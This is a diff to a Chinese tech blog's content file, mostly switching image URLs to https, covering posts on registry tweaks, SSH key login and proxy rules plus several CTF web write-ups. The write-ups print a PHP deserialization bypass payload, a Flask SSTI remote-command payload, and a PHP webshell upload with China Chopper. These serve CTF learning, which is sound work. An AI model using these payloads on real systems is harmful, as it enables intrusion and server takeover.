@@ -109,7 +109,7 @@
     <content><![CDATA[<p>经常使用</p>
 <p>经常需要新建 markdown 文件，每次都要改后缀实在太麻烦了。</p>
 <p>何不在<strong>新建菜单</strong>里添加 md 格式呢？</p>
-<p><img src="http://markdown.yeek.top/20200215164723.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200215164723.png" alt=""></p>
 <a id="more"></a>
 
 <p>本文主要参考一方天地的博客</p>
@@ -118,13 +118,13 @@
 <p><kbd>Win + R</kbd> 输入 regedit ，打开注册表编辑器</p>
 <h2 id="修改菜单"><a href="#修改菜单" class="headerlink" title="修改菜单"></a>修改菜单</h2><p>进入<code>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew</code>下的 <code>Classes</code> 字符串项，双击直接修改。</p>
 <p>这里我添加了 .md 后缀</p>
-<p><img src="http://markdown.yeek.top/20200215165756.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200215165756.png" alt=""></p>
 <p><strong>接着需要修改权限，防止被系统改回去</strong></p>
 <p>右键 ShellNew 项（文件夹），选择 权限 -&gt; 高级 -&gt; 关闭继承 -&gt; 将已继承的权限……</p>
-<p><img src="http://markdown.yeek.top/20200215170020.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200215170020.png" alt=""></p>
 <p>双击编辑权限条目，去掉 <code>SYSTEM</code>、<code>当前用户</code>、<code>Administrator</code> 的 <code>完全控制</code>。 </p>
 <p>最后入下图即可</p>
-<p><img src="http://markdown.yeek.top/20200215170329.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200215170329.png" alt=""></p>
 <div class="note info">
             <p>之后再想修改列表，需要开启 <code>当前用户</code> 的权限才可以修改。</p>
           </div>
@@ -137,7 +137,7 @@
 
 <p>新建一个 txt 文件，将上面的内容复制进去保存。改后缀名为 <code>.reg</code> ，执行。</p>
 <p>完事。</p>
-<p><img src="http://markdown.yeek.top/20200215164723.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200215164723.png" alt=""></p>
 <div class="note warning">
             <p>如果翻车了，可能会导致 资源管理器 崩溃。</p><p>得去 <code>计算机\HKEY_CLASSES_ROOT</code>  里找到对应的后缀文件夹，删除添加进去的内容</p><p>别傻憨憨的用滚轮找，注册表编辑器里 <kbd>Ctrl + F</kbd>可以查找，<mark>地址栏也有补全</mark>。</p>
           </div>]]></content>
@@ -174,7 +174,7 @@
 <p>添加以下内容到 <code>&lt;mirros&gt;</code> 中</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>          </span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="http://markdown.yeek.top/20200210230739.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200210230739.png" alt=""></p>
 ]]></content>
       <categories>
         <category>mix</category>
@@ -189,9 +189,9 @@
     <url>/post/60542.html</url>
     <content><![CDATA[<h2 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h2><p>地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1</a></p>
 <p>PHP 反序列，老题新做了。</p>
-<p><img src="http://markdown.yeek.top/20200211215026.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200211215026.png" alt=""></p>
 <p>打开 <code>index.php</code> 是这样的</p>
-<p><img src="http://markdown.yeek.top/20200211215256.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200211215256.png" alt=""></p>
 <a id="more"></a>
 
 
@@ -243,7 +243,7 @@
 </blockquote>
 <h3 id="获取-flag"><a href="#获取-flag" class="headerlink" title="获取 flag"></a>获取 flag</h3><h4 id="构造-序列化"><a href="#构造-序列化" class="headerlink" title="构造 序列化"></a>构造 序列化</h4><p>根据注释的明示直接访问 fl4g.php ，果然是一片空白。</p>
 <p>不过证明的确实有这个文件，并且 flag 就存在这个文件的代码中，需要我们使用 <code>highlight_file</code> 方法来显示出来。</p>
-<p><img src="http://markdown.yeek.top/20200211233941.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200211233941.png" alt=""></p>
 <p>构造 <code>Demo</code> 类，传入 <code>$file = fl4g.php</code> ，然后反序列化</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'fl4g.php'</span>;</span><br><span class="line">$demo = <span class="keyword">new</span> Demo($file);</span><br><span class="line">$s = serialize($demo);</span><br><span class="line">print_r($s);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">print_r(base64_encode($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -256,9 +256,9 @@
 <p>base64 编码后：</p>
 <p><code>Tzo0OiJEZW1vIjoxOntzOjEwOiIARGVtbwBmaWxlIjtzOjg6ImZsNGcucGhwIjt9</code></p>
 <h4 id="绕过正则匹配"><a href="#绕过正则匹配" class="headerlink" title="绕过正则匹配"></a>绕过正则匹配</h4><p>直接传进去，果然被匹配到了</p>
-<p><img src="http://markdown.yeek.top/20200212001625.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212001625.png" alt=""></p>
 <p>不清楚正则匹配的话，在这个网站上(<a href="https://www.regextester.com/" target="_blank" rel="noopener">regextester</a>)可以知道匹配到的部分是前面的 <code>O:4:</code></p>
-<p><img src="http://markdown.yeek.top/20200212011140.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212011140.png" alt=""></p>
 <p>可以在 <code>4</code> 前面加上 <code>+</code> 来绕过，因为在 php 语法中，<code>+4</code> = <code>4</code></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">print</span>(+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="number">-4</span>);</span><br></pre></td></tr></table></figure>
 
@@ -268,7 +268,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var?&#x3D;TzorNDoiRGVtbyI6MTp7czoxMDoiRGVtbyAgZmlsZSI7czo4OiJmbDRnLnBocCI7fQ</span><br></pre></td></tr></table></figure>
 
 <p>果不其然的显示回 index.php 的源码了。</p>
-<p><img src="http://markdown.yeek.top/20200212003517.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212003517.png" alt=""></p>
 <p>这是因为 <strong>反序列化 Demo 对象</strong>后调用了 <code>__wakeup</code> 方法，重新将传入的 <code>fl4g.php</code> 设置为 <code>index.php</code> 了</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">        <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -293,7 +293,7 @@
 <p>经过多方百度后，发现了一个<strong>盲点</strong>——由于 <code>Demo</code> 类的 <code>file</code> 属性是<strong>私有属性</strong>序列化之后，在类名前后会有 %00 阻断。</p>
 <p>并且在 <code>s:10:&quot;Demofile&quot;</code> 也有提示，<code>Demofile</code> 是 8 个字符，为什么是 <code>s:10</code>  呢？就是因为前后有 %00</p>
 <p>图形化就是这样：</p>
-<p><img src="http://markdown.yeek.top/20200212004354.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212004354.png" alt=""></p>
 <p><code>%44%65%6d%6f</code>进行 hex 转化后 就是 <code>Demo</code> ，可以在这个网站上测试 <a href="https://www.107000.com/T-Hex/" target="_blank" rel="noopener">Hex编码/解码</a></p>
 <p><strong>坑来了：</strong></p>
 <p>如果直接复制文本样式，在别的地方进行base64编码会<strong>丢失掉 <code>%00</code> 的信息</strong>！！再 解码-&gt;反序列化 自然与我之前序列化的 Demo <strong>不是同一个东西</strong></p>
@@ -307,11 +307,11 @@
 <p>使用了 <code>str_replace</code> 方法来进行替换</p>
 <p>这样编码后的结果就还是带有 <code>%00</code> 的了：</p>
 <p><code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
-<p><img src="http://markdown.yeek.top/20200212005224.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212005224.png" alt=""></p>
 <p>载荷</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?var&#x3D;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://markdown.yeek.top/20200212005244.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200212005244.png" alt=""></p>
 <h2 id="0x02-技术总结"><a href="#0x02-技术总结" class="headerlink" title="0x02 - 技术总结"></a>0x02 - 技术总结</h2><ol>
 <li>__wakeup 方法是反序列化后调用的方法，可以利用<strong>超属性</strong>的方法来绕过</li>
 <li>在 php 中 <code>4</code> = <code>+4</code> ，可以用来绕过正则匹配</li>
@@ -333,7 +333,7 @@
     <title>CentOS-使用秘钥登录</title>
     <url>/post/1528.html</url>
     <content><![CDATA[<p>使用秘钥连接之后终端可以直接快速连接，而且使用  VS Code 的时候也可以免输密码</p>
-<p><img src="http://markdown.yeek.top/20200209201052.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200209201052.png" alt=""></p>
 <a id="more"></a>
 
 <br>
@@ -347,18 +347,18 @@
 <h2 id="生成和保存秘钥"><a href="#生成和保存秘钥" class="headerlink" title="生成和保存秘钥"></a>生成和保存秘钥</h2><p>生成秘钥，执行后直接回车三下即可</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://markdown.yeek.top/20200209184309.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200209184309.png" alt=""></p>
 <p>进入 <code>/root/.ssh</code> 目录，执行以下指令</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建授权秘钥</span></span><br><span class="line">touch authorized_keys</span><br><span class="line"><span class="comment"># 将公钥写进授权秘钥中</span></span><br><span class="line">cat id_rsa.pub &gt;&gt;  authorized_keys</span><br><span class="line"><span class="comment"># 为了安全，修改授权秘钥的权限</span></span><br><span class="line">chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>
 
 
 
 <p>下载私钥文件 <code>id_rsa</code> 到本地，当然也可以使用 ftp 或者 sz </p>
-<p><img src="http://markdown.yeek.top/20200209185252.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200209185252.png" alt=""></p>
 <p>建议保存到用户名下的 <code>.ssh</code> 目录下中，以方便之后的远程连接</p>
-<p><img src="http://markdown.yeek.top/20200209201512.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200209201512.png" alt=""></p>
 <h2 id="开启秘钥登录"><a href="#开启秘钥登录" class="headerlink" title="开启秘钥登录"></a>开启秘钥登录</h2><p>打开 /etc/ssh/sshd_config ，将 <code>RSAAuthentication</code> 和 <code>PubkeyAuthentication</code> 前面的注释去掉</p>
-<p><img src="http://markdown.yeek.top/20200209200107.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200209200107.png" alt=""></p>
 <p>接着重启 sshd 服务，执行</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>
 
@@ -372,7 +372,7 @@
 
 
 <p>接着就可以使用各种终端连接了</p>
-<p><img src="http://markdown.yeek.top/20200209201052.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200209201052.png" alt=""></p>
 ]]></content>
       <categories>
         <category>oam</category>
@@ -385,20 +385,20 @@
   <entry>
     <title>攻防世界 WEB Web_python_template_injection</title>
     <url>/post/57753.html</url>
-    <content><![CDATA[<h1 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h1><p><img src="http://markdown.yeek.top/20200118132746.png" alt=""></p>
+    <content><![CDATA[<h1 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h1><p><img src="https://markdown.yeek.top/20200118132746.png" alt=""></p>
 <a id="more"></a>
 
 
 <h1 id="0x01-解题过程"><a href="#0x01-解题过程" class="headerlink" title="0x01 - 解题过程"></a>0x01 - 解题过程</h1><p>打开是单一网页，注释中也没有其他提示。</p>
-<p><img src="http://markdown.yeek.top/20200118132924.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200118132924.png" alt=""></p>
 <p>通过百度得知，是要利用 flask 模板的代码注入漏洞。就例如下面这种</p>
-<p><img src="http://markdown.yeek.top/20200118133342.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200118133342.png" alt=""></p>
 <p>这是某大神已经写好的远程执行漏洞，在popen里填入指令就行了。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% <span class="keyword">if</span> b.<span class="keyword">__class__</span> == &#123;&#125;.<span class="keyword">__class__</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
 
 <p>效果如下</p>
-<p><img src="http://markdown.yeek.top/20200118133907.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20200118133951.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200118133907.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200118133951.png" alt=""></p>
 <h1 id="0x02-技术总结"><a href="#0x02-技术总结" class="headerlink" title="0x02 - 技术总结"></a>0x02 - 技术总结</h1><p>这道题属于 <strong>SSTI——服务端模板注入攻击</strong> ，其实在 <code>Chrome</code> 的 <code>Hackbar</code> 中有测试载荷。</p>
 <p><strong>SSTI</strong> 读取文载荷</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">'fl4g'</span>).read()</span><br></pre></td></tr></table></figure>
@@ -417,15 +417,15 @@
     <title>优雅的科学上网</title>
     <url>/post/23204.html</url>
     <content><![CDATA[<p>通过自定义 PAC 规则和 <a href="https://proxy-switchyomega.com/" target="_blank" rel="noopener">SwitchyOmega</a> 插件，优雅的科学上网。当然首先你得自己找到科学上网的方法，然后才能讨论如何优雅。</p>
-<p><img src="http://markdown.yeek.top/20200117220553.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117220553.png" alt=""></p>
 <a id="more"></a>
 
 
 
 <p>酸酸乳 的作者已经很久没有更新了，其内置的 <code>PAC规则</code> 已经不能很好的与某墙同步了。</p>
 <p>具体的体现就是使用 PAC规则 的时候，GitHub 的图片和raw代码经常 <code>404</code> 。</p>
-<p><img src="http://markdown.yeek.top/20200117221613.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20200117221808.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117221613.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117221808.png" alt=""></p>
 <p>因此，就需要我们自己 <strong>手动设置 PAC规则</strong> 了</p>
 <p>主要参考的是 某中文网 的设置（访问需要梯子）</p>
 <blockquote>
@@ -436,14 +436,14 @@
 <p>或者直接 <kbd>复制粘贴</kbd> 到酸酸乳安装目录中的  <code>pac.txt</code> 中。</p>
 <p>选择代理模式为PAC模式。</p>
 <p><a href="https://raw.githubusercontent.com/petronny/gfwlist2pac/master/gfwlist.pac" target="_blank" rel="noopener">xxxlist.pac</a></p>
-<p><img src="http://markdown.yeek.top/20200117222841.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117222841.png" alt=""></p>
 <blockquote>
 <p><a href="https://github.com/petronny/gfwlist2pac" target="_blank" rel="noopener">支持更新规则的项目</a></p>
 </blockquote>
 <h1 id="Android-下的配置"><a href="#Android-下的配置" class="headerlink" title="Android 下的配置"></a>Android 下的配置</h1><p>在下面这个项目中挑选适合你的规则，接着在客户端的 <code>路由</code> 中选择 <code>自定义ACL文件</code> ，在弹出的窗口中填入 <code>规则连接</code> 即可。</p>
 <p><a href="https://github.com/ACL4SSR/ACL4SSR" target="_blank" rel="noopener">ACL4SSR</a></p>
-<p><img src="http://markdown.yeek.top/20200117224514.jpg" alt=""></p>
-<p><img src="http://markdown.yeek.top/20200117224524.jpg" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117224514.jpg" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117224524.jpg" alt=""></p>
 <h1 id="Chrome-和-FireFox-下的配置"><a href="#Chrome-和-FireFox-下的配置" class="headerlink" title="Chrome 和 FireFox 下的配置"></a>Chrome 和 FireFox 下的配置</h1><p>推荐使用 <a href="https://proxy-switchyomega.com/" target="_blank" rel="noopener">SwitchyOmega</a> 这个插件，如果遇到 PAC 没有及时更新的域名，可以字节添加规则</p>
 ]]></content>
       <categories>
@@ -457,30 +457,30 @@
   <entry>
     <title>攻防世界 WEB upload1</title>
     <url>/post/17040.html</url>
-    <content><![CDATA[<h1 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h1><p><img src="http://markdown.yeek.top/20200117152226.png" alt=""></p>
+    <content><![CDATA[<h1 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h1><p><img src="https://markdown.yeek.top/20200117152226.png" alt=""></p>
 <a id="more"></a>
 
 <h1 id="0x01-解题过程"><a href="#0x01-解题过程" class="headerlink" title="0x01 - 解题过程"></a>0x01 - 解题过程</h1><p>打开页面，只有一个上传模块</p>
-<p><img src="http://markdown.yeek.top/20200117152444.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117152444.png" alt=""></p>
 <p>既然题目是 <strong>uplaod1</strong> 那就可以试一下上传一句话木马。</p>
 <p>下面就是一句话木马的内容，只要上传到服务器后，就可以用工具连接控制服务器了。</p>
-<p><img src="http://markdown.yeek.top/20200117161249.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117161249.png" alt=""></p>
 <p>选择完木马文件之后果然被阻止了，上传按钮不可用了。</p>
 <p><img src="http://markdown.yeek.top/20200117152545.png" alt="上传提示"></p>
-<p><img src="http://markdown.yeek.top/20200117155007.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117155007.png" alt=""></p>
 <p>分析 js 代码，是把按钮给 <code>disable</code> 了。</p>
-<p><img src="http://markdown.yeek.top/20200117155400.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117155400.png" alt=""></p>
 <p>那很简单，在 <code>html</code> 里吧 <code>disable</code> 删掉就可以继续上传了</p>
-<p><img src="http://markdown.yeek.top/20200117155937.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20200117160702.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117155937.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117160702.png" alt=""></p>
 <p>得到上传的地址。访问地址没有404，说明正常打开了。</p>
-<p><img src="http://markdown.yeek.top/20200117160924.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117160924.png" alt=""></p>
 <p>使用中国菜刀连接。</p>
-<p><img src="http://markdown.yeek.top/20200117161215.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117161215.png" alt=""></p>
 <p>能访问服务器文件。开始找flag</p>
-<p><img src="http://markdown.yeek.top/20200117161357.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117161357.png" alt=""></p>
 <p>一般不是在服务器的根目录就是在网站的根目录，这道题是后者</p>
-<p><img src="http://markdown.yeek.top/20200117161513.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200117161513.png" alt=""></p>
 <h1 id="0x02-技术总结"><a href="#0x02-技术总结" class="headerlink" title="0x02 - 技术总结"></a>0x02 - 技术总结</h1><ul>
 <li>注意看网页的源码</li>
 </ul>
@@ -548,9 +548,9 @@
 
 
 
-<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="http://markdown.yeek.top/20191219015217.png" alt=""></p>
+<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="https://markdown.yeek.top/20191219015217.png" alt=""></p>
 <h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>目录如下图：</p>
-<p><img src="http://markdown.yeek.top/20191219022040.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219022040.png" alt=""></p>
 <p><strong>index.html :</strong> </p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>TODO List<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-id">#todoList</span> &#123;</span></span><br><span class="line">            list-style-type: none;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"todoList"</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> todoList = <span class="built_in">document</span>.querySelector(<span class="string">'#todoList'</span>);</span></span><br><span class="line"><span class="javascript">    fetch(<span class="string">'todo.php'</span>).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        if (res.(1) === 200) &#123;   <span class="comment">&lt;!-- 此行中请填写第（1）空 --&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            res.(2)().then((list) =&gt; &#123;   <span class="comment">&lt;!-- 此行中请填写第（2）空 --&gt;</span></span></span></span><br><span class="line"><span class="javascript">                list.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">let</span> li = <span class="built_in">document</span>.createElement(<span class="string">'li'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">let</span> checkbox = <span class="built_in">document</span>.createElement(<span class="string">'input'</span>);</span></span><br><span class="line"><span class="actionscript">                    checkbox.type = <span class="string">'checkbox'</span>;</span></span><br><span class="line"><span class="actionscript">                    checkbox.id = <span class="string">"todo_"</span> + item.id;</span></span><br><span class="line">                    if (item.completed) &#123;</span><br><span class="line"><span class="actionscript">                        checkbox.checked = <span class="literal">true</span>; <span class="comment">/* 当完成时将checkbox勾选上 */</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                    li.appendChild(checkbox);</span><br><span class="line"><span class="javascript">                    <span class="keyword">let</span> label = <span class="built_in">document</span>.createElement(<span class="string">'label'</span>);</span></span><br><span class="line">                    label.innerText = item.text;</span><br><span class="line"><span class="actionscript">                    label.htmlFor = <span class="string">"todo_"</span> + item.id;</span></span><br><span class="line">                    li.appendChild(label);</span><br><span class="line">                    todoList.appendChild(li);</span><br><span class="line"><span class="actionscript">                    checkbox.addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(e)</span> </span>&#123;</span></span><br><span class="line">                        e.preventDefault();</span><br><span class="line"><span class="javascript">                        <span class="keyword">let</span> newStatus = <span class="keyword">this</span>.checked ? <span class="number">1</span> : <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">let</span> data = <span class="keyword">new</span> (<span class="number">3</span>)();   <span class="xml"><span class="comment">&lt;!-- 此行中请填写第（3）空 --&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                        data.append('(4)', (5));//设置提交的参数     <span class="comment">&lt;!-- 此行中请填写第（4）和第（5）空 --&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                        fetch('todo.php(6)' + item.id, &#123;   <span class="comment">&lt;!-- 此行中请填写第（6）空 --&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                            '(7)': data,    <span class="comment">&lt;!-- 此行中请填写第（7）空 --&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                            '(8)': '(9)'    <span class="comment">&lt;!-- 此行中请填写第（8）和第（9）空 --&gt;</span></span></span></span><br><span class="line"><span class="javascript">                        &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span></span><br><span class="line">                            if (res.status === 200) &#123;</span><br><span class="line"><span class="javascript">                                res.json().then(<span class="function">(<span class="params">json</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                                    if (json.(10)) &#123;   <span class="comment">&lt;!-- 此行中请填写第（10）空 --&gt;</span></span></span></span><br><span class="line">                                        alert(json.error)</span><br><span class="line"><span class="actionscript">                                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">                                        checkbox.checked = !!newStatus;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;)</span><br><span class="line"><span class="actionscript">                            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">                                alert(<span class="string">'操作异常'</span>)</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 